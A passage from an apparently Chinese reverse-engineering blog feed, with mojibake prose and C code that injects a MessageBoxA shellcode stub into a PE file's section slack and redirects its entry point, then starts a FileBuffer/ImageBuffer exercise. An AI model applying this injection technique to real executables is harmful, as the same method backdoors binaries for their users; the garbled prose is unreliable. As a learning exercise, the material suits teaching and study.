Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders) <span class="hljs-comment">//å¤´éƒ¨ç›´æ¥è¿”å›</span><br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<span class="hljs-comment">//èŠ‚åŒºåˆ¤æ–­æ¡ä»¶</span><br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>,FOA_TO_RVA(<span class="hljs-number">0x5d380</span>,buffer));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>,RVA_TO_FOA(<span class="hljs-number">0x5df80</span>,buffer));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è®¡ç®—åœ°å€"><a href="#è®¡ç®—åœ°å€" class="headerlink" title="è®¡ç®—åœ°å€"></a>è®¡ç®—åœ°å€</h3><h4 id="çœŸæ­£ImageBase"><a href="#çœŸæ­£ImageBase" class="headerlink" title="çœŸæ­£ImageBase"></a>çœŸæ­£ImageBase</h4><p>ç”±äºè®¾å¤‡ç­‰åŸå› ï¼Œç¨‹åºå¹¶ä¸ä¸€å®šä¼šåŠ è½½åˆ°ImageBaseçš„åœ°æ–¹ï¼Œè¿™æ—¶å°±éœ€è¦åˆ¤æ–­ç¨‹åºä¼šåŠ è½½åˆ°ä»€ä¹ˆåŸºå€ä¸Šã€‚æœ€å¥½çš„åŠæ³•å°±æ˜¯ä½¿ç”¨è°ƒè¯•å·¥å…·ï¼Œç¨‹åºå°±ä¼šè‡ªåŠ¨æ–­åœ¨OEPå¤„ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021751427.png"></p><p>æ­¤æ—¶çš„OEPåœ°å€ä¸º0x6DEFCï¼Œæ˜¯ç”¨PEæŸ¥çœ‹å™¨æˆ–è€…è‡ªå·±æ‰‹åŠ¨æ‰¾æ–‡ä»¶ä¸­çš„OEPï¼Œå°±æ˜¯å¯é€‰å¤´çš„<code>AddressOfEntryPoint</code>å­—æ®µå¯å¾—0x5DEFCï¼Œé‚£ä¹ˆå¾ˆæ˜¾ç„¶ï¼ŒçœŸæ­£çš„ImageBaseå°±æ˜¯0x10000ã€‚</p><h4 id="ä¿®æ”¹OEP"><a href="#ä¿®æ”¹OEP" class="headerlink" title="ä¿®æ”¹OEP"></a>ä¿®æ”¹OEP</h4><p>shellcodeåœ¨æ–‡ä»¶ä¸­èµ·å§‹åœ°å€æ˜¯0x5D380ï¼Œè½¬åŒ–ä¸ºRVAå¯å¾—0x5DF80ï¼Œé‚£ä¹ˆåªéœ€è¦æŠŠOEPæ”¹å†™ä¸º0x5DF80å³å¯ï¼Œä¿®æ”¹å®Œå†æ‹–å…¥è°ƒè¯•å™¨åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œå¯ä»¥ä»ä¸­çœ‹è§æ’å…¥çš„shellcodeï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è®¡ç®—åç§»</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021804821.png"></p><p>å‡½æ•°MessageBoxAåœ¨å†…å­˜ä¸­åœ°å€æ˜¯0x75B23D90ï¼ˆå¯ä»¥é€šè¿‡ç¬¦å·æŸ¥çœ‹ç­‰æ–¹å¼æ‰¾ï¼Œæ­¤å‡½æ•°åœ¨user32.dllé‡Œï¼Œä¸åŒè®¾å¤‡è¿™ä¸ªå€¼ä¹Ÿä¼šä¸åŒï¼‰ï¼Œé‚£ä¹ˆè®¡ç®—callçš„åœ°å€å°±æ˜¯è¦è·³è½¬çš„åœ°å€ - ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œå…·ä½“è®¡ç®—å°±æ˜¯<code>0x75B23D90 - 0x6DF8D = 0x75AB5E03 </code>ï¼ŒåŒç†jmpçš„åœ°å€<code>0x6DEFC - 0x6DF92 =0xffffff6a </code>ï¼ˆè¦jmpçš„åœ°å€æ˜¯åŸæ¥çš„OEP)</p><p>å› æ­¤åœ¨æ–‡ä»¶ä¸­æ”¹ä¸º</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021807664.png"></p><p>åœ¨è°ƒè¯•å™¨ä¸­ä¸ºï¼ŒæˆåŠŸæ˜¾ç¤ºç›¸å…³å‡½æ•°ï¼</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021809257.png"></p><p>æ­¤æ—¶ä¹Ÿèƒ½æŒ‰ç…§é¢„æœŸçš„æ–¹å¼å»è¿è¡Œï¼Œå³å…ˆå¼¹çª—å†æ­£å¸¸æ‰§è¡Œ</p><h3 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h3><p>ç”¨åˆ°äº†ä»¥å‰çš„å‡ ä¸ªå‡½æ•°</p><p>å®šä¹‰äº†ImageBase çš„å® ä»¥åŠ MessageBoxçš„å®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ImgaeBase  0x10000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MessageBox_Addr 0x75C93D90</span><br>BYTE Shell[] = &#123;<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xE8</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xe9</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>&#125;;<br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    SectionHeader +=<span class="hljs-number">1</span>;<br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Shell_add</span><span class="hljs-params">(<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)buffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(buffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-type">char</span>* shell_begin = buffer + SectionHeader-&gt;PointerToRawData + SectionHeader-&gt;Misc.VirtualSize ;<br><br>DWORD begin_FOA = SectionHeader-&gt;PointerToRawData + SectionHeader-&gt;Misc.VirtualSize;<br><br><br>DWORD e8_FOA = begin_FOA + <span class="hljs-number">8</span>;<br>DWORD e9_FOA = e8_FOA + <span class="hljs-number">5</span>;<br><br>DWORD begin_RVA = FOA_TO_RVA(begin_FOA,buffer);<br><span class="hljs-comment">//è®¡ç®—callåœ°å€çš„ç¼–ç  å³e8 xxxxx</span><br>DWORD e8_x_addr = MessageBox_Addr - (FOA_TO_RVA(e9_FOA,buffer)+ImgaeBase);<br><span class="hljs-comment">//è®¡ç®—åŸoepçš„åœ°å€ç¼–ç  å³e9 xxxxx</span><br>DWORD e9_x_addr = OptionalHeader-&gt;AddressOfEntryPoint - (FOA_TO_RVA(e9_FOA,buffer)+<span class="hljs-number">5</span>);<br><br><span class="hljs-comment">//å…ˆä¿®æ”¹åŸOEP</span><br>OptionalHeader-&gt;AddressOfEntryPoint = FOA_TO_RVA(begin_FOA,buffer);<br><br>    <span class="hljs-built_in">memcpy</span>(shell_begin,Shell,<span class="hljs-number">18</span>);<br><br><span class="hljs-comment">//è¿™é‡Œè¦æ³¨æ„memcpyçš„ç”¨æ³•</span><br>DWORD* e8 = (DWORD*)(shell_begin + <span class="hljs-number">9</span>);<br>DWORD* e9 = (DWORD*)(shell_begin + <span class="hljs-number">14</span>);<br><span class="hljs-built_in">memcpy</span>(e8,&amp;e8_x_addr,<span class="hljs-number">4</span>);<span class="hljs-comment">//è¿™é‡Œä¹Ÿå¯èƒ½æ˜¯1ï¼ŒæŠŠ4æ”¹ä¸º1</span><br><span class="hljs-built_in">memcpy</span>(e9,&amp;e9_x_addr,<span class="hljs-number">4</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_shell.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    Shell_add(buffer);<br>    fwrite(buffer,size,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><p>1.ä¹Ÿå¯ä»¥ç›´æ¥æ‹‰ä¼¸æˆImageBufferåå†patchï¼Œéƒ½æ˜¯ä¸€æ ·</p><p>2.ä¹Ÿå¯ä»¥åœ¨IDAé‡Œé¢ç›´æ¥patchï¼Œæ„é€ å‡ ä¸ªç®€å•ROPå³å¯</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆä¸‰ï¼‰</title>
    <link href="/2023/07/02/PE_2/"/>
    <url>/2023/07/02/PE_2/</url>
    
    <content type="html"><![CDATA[<p>PEç»ƒä¹ ï¼ŒFileBufferâ€“ImageBufferâ€“FileBuffer</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>ç›®å‰æˆ‘ä»¬å·²ç»çŸ¥é“PEæ–‡ä»¶ç»“æ„å¤§è‡´ç»„æˆéƒ¨åˆ†ï¼Œå³</p><ul><li><p>DOSå¤´ï¼Œä¸»è¦æˆå‘˜</p><ul><li>MZæ ‡å¿—</li><li>e_lfanew NTå¤´çš„æ–‡ä»¶åç§»</li></ul><p>NTå¤´åˆå¯ä»¥åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ† Signature æ ‡å‡†PEå¤´ å¯é€‰PEå¤´</p></li><li><p>Signatureï¼Œå³â€œPEâ€æ ‡è¯†</p></li><li><p>æ ‡å‡†PEå¤´ï¼Œä¸»è¦æˆå‘˜</p><ul><li>Machine å¯è¿è¡Œçš„CPU</li><li>NumberOfSections èŠ‚åŒºæ•°é‡</li><li>TimeDateStamp æ—¶é—´æˆ³</li><li>Characteristics æ–‡ä»¶å±æ€§</li></ul></li><li><p>å¯é€‰PEå¤´ä¸»è¦æˆå‘˜</p><ul><li>Magic PEç±»å‹ 32ä½ or 64ä½ï¼Ÿ</li><li>AddressOfEntryPoint ç¨‹åºå…¥å£RVA</li><li>ImageBase ç¨‹åºä¼˜å…ˆè£…è½½åœ°å€</li><li>SectionAlignment å†…å­˜å¯¹é½ç²’åº¦</li><li>FileAlignment æ–‡ä»¶å¯¹é½ç²’åº¦</li><li>SizeOfImage å†…å­˜ä¸­PEæ–‡ä»¶æ˜ åƒå¤§å°</li><li>SizeOfHeaders æ‰€æœ‰å¤´åŒ…æ‹¬èŠ‚è¡¨æŒ‰æ–‡ä»¶å¯¹é½åçš„å¤§å°</li></ul></li><li><p>èŠ‚è¡¨</p><ul><li>BYTE 8å­—èŠ‚åå­—</li><li>Misc åœ¨å†…å­˜ä¸­çœŸå®å¤§å°</li><li>VirtualAddress å†…å­˜ä¸­åç§» å³RVA</li><li>SizeOfRawData æ–‡ä»¶å¯¹é½åå°ºå¯¸</li><li>PointerToRawData èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­åç§»</li><li>Characteristics èŠ‚åŒºå±æ€§</li></ul></li></ul><p>å®é™…ä¸Šè¿™äº›éƒ¨åˆ†å°±å·²ç»å¯ä»¥å†³å®šä¸€ä¸ªPEæ–‡ä»¶çš„å…¨éƒ¨çš„ä¸œè¥¿äº†ï¼Œå¯ä»¥é€šè¿‡å¤´æ‰¾åˆ°èŠ‚è¡¨ï¼Œç”±èŠ‚è¡¨æ‰¾åˆ°æ¯ä¸€ä¸ªèŠ‚åŒºï¼Œæ¯ä¸€ä¸ªèŠ‚åŒºå°±å­˜æ”¾äº†è¿è¡Œæ—¶çš„ä¿¡æ¯ã€‚</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h3><p>å°†ä¸€ä¸ªEXEæ–‡ä»¶ä»æ–‡ä»¶å½¢å¼æ‹‰ä¼¸æˆå†…å­˜å½¢å¼ï¼Œå†ç”±å†…å­˜å½¢å¼å‹ç¼©å›æ–‡ä»¶å½¢å¼ï¼Œå­˜ç›˜åèƒ½è¿è¡Œ</p><p>noteï¼šè¿™é‡Œçš„å†…å­˜æ˜¯æŒ‡ç”±mallocåˆ†é…çš„å †ç©ºé—´åœ°å€ï¼Œä¸æ˜¯ç¨‹åºImageBaseçš„åœ°å€</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307012317292.png"></p><h3 id="éœ€è¦è§£å†³çš„é—®é¢˜"><a href="#éœ€è¦è§£å†³çš„é—®é¢˜" class="headerlink" title="éœ€è¦è§£å†³çš„é—®é¢˜"></a>éœ€è¦è§£å†³çš„é—®é¢˜</h3><p>Q1ï¼šè¦æ‹·è´çš„æ•°æ®åœ¨å“ª</p><p>A1ï¼šå„ç§å¤´çš„æ•°æ®åœ¨FileBufferæœ€å‰é¢ï¼Œè€Œä¸”ç´§ç´§ç›¸è¿ï¼Œä¸­é—´æ²¡æœ‰ç©ºï¼ŒåŒæ—¶å¤§å°ç”±SizeOfHeaderså†³å®šï¼›èŠ‚åŒºåœ°å€å¯ä»¥ç”±èŠ‚è¡¨ä¸­çš„PointerToRawDataæ‰¾åˆ°</p><p>Q2ï¼šè¦åˆ†é…å¤šå°‘ç©ºé—´æ¥å­˜å‚¨copyæ•°æ®</p><p>A2ï¼šåœ¨å¯é€‰PEå¤´ä¸­æœ‰ä¸€ä¸ª<code>SizeOfImage </code>æˆå‘˜ï¼Œå®ƒå†³å®šäº†åœ¨å†…å­˜ä¸­PEæ–‡ä»¶çš„å¤§å°ï¼Œå› æ­¤åˆ†é…<code>SizeOfImage </code>ç©ºé—´å³å¯</p><p>Q3ï¼šè¦æŠŠæ•°æ®copyå»å“ªé‡Œ</p><p>A3ï¼šå„ç§å¤´çš„æ•°æ®å¯ä»¥ç›´æ¥copyåˆ°ImageBufferçš„å‰é¢ï¼ŒèŠ‚åŒºåœ°å€å¯ä»¥ç”±èŠ‚è¡¨ä¸­æ¯ä¸€ä¸ªç»“æ„ä½“çš„<code>VirtualAddress</code>å†³å®š</p><p>åŒç†ä»ImageBufferæ‹·è´åˆ°FileBufferæ—¶ï¼Œå¤´éƒ¨æ•°æ®ä¹Ÿä¸å˜ï¼ŒèŠ‚åŒºåœ°å€åˆ™å¯ç”±èŠ‚è¡¨ä¸­çš„<code>PointerToRawData </code>å†³å®š</p><p>Q4ï¼šèŠ‚åŒºå¤§å°å¦‚ä½•ç¡®å®š</p><p>A4ï¼šèŠ‚åŒºå¤§å°å¯ä¸èŠ‚è¡¨ä¸¤ä¸ªæˆå‘˜ç›¸å…³ï¼Œç¬¬ä¸€ä¸ªæ˜¯Miscï¼Œç¬¬äºŒä¸ªæ˜¯SizeOfRawDataã€‚ä»å›¾ä¸­å¯èƒ½ä¼šè§‰å¾—SizeOfRawDataä¸€å®šå¤§äºMiscï¼Œå…¶å®å¹¶ä¸ä¸€å®šã€‚è€ƒè™‘è¿™ä¸ªæƒ…å½¢ï¼Œåœ¨ç¼–å†™ç¨‹åºæ—¶ï¼Œä»…å£°æ˜ä¸€ä¸ªå…¨éƒ¨å˜é‡<code>char ch[1000]</code>è€Œå¹¶ä¸åˆå§‹åŒ–ï¼Œé‚£ä¹ˆåœ¨æ–‡ä»¶ä¸­å°±ä¸ä¼šä¸ºè¿™ä¸ªå˜é‡åˆ†é…ç©ºé—´å­˜å‚¨ï¼Œåªæœ‰åœ¨å†…å­˜ä¸­æ—¶æ‰ä¼šåˆ†é…ã€‚è€ŒMiscæ‰€æŒ‡çš„å¤§å°å°±æ˜¯åœ¨å†…å­˜ä¸­çš„å¤§å°ï¼Œé‚£ä¹ˆè¿™æ—¶å€™Miscå°±æœ‰å¯èƒ½å¤§äºSizeOfRawData</p><p>é‚£ä¹ˆæ˜¯ä¸æ˜¯è°å¤§ç”¨è°å‘¢ï¼Ÿä¹Ÿä¸æ˜¯ï¼Œè¿˜æ˜¯ä»¥åˆšåˆšä¸ºä¾‹ï¼Œå¦‚æœæ‰§æ„ä½¿ç”¨Miscä½œä¸ºè¦copyçš„èŠ‚åŒºå¤§å°ï¼Œç”±äºåœ¨æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰ä¸ºå…¶åˆ†é…å¤§å°ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±æœ‰å¯èƒ½ä¼šæŠŠä¸‹ä¸€ä¸ªèŠ‚åŒºæ•°æ®ä¹Ÿcopyè¿›æ¥ï¼Œè¿™å°±ä¹±å¥—äº†ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆç­”æ¡ˆå°±æ˜¯ï¼Œç”¨å°çš„ï¼Œæˆ–è€…åªç”¨SizeOfRawDataï¼Œè¿™æ ·èƒ½ä¿è¯ç²¾ç¡®åœ°æŠŠè¯¥èŠ‚åŒºæ•°æ®å…¨éƒ¨æ­£ç¡®copyï¼Œå³ä½¿è¿˜è¦éœ€è¦å†…å­˜ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯ç´§è·Ÿå·²copyæ•°æ®ä¹‹åï¼Œè€Œä¸”ä¸‹ä¸€ä¸ªèŠ‚åŒºåœ°VirtualAddressä¿è¯äº†æœ‰è¶³å¤Ÿç©ºé—´</p><h3 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 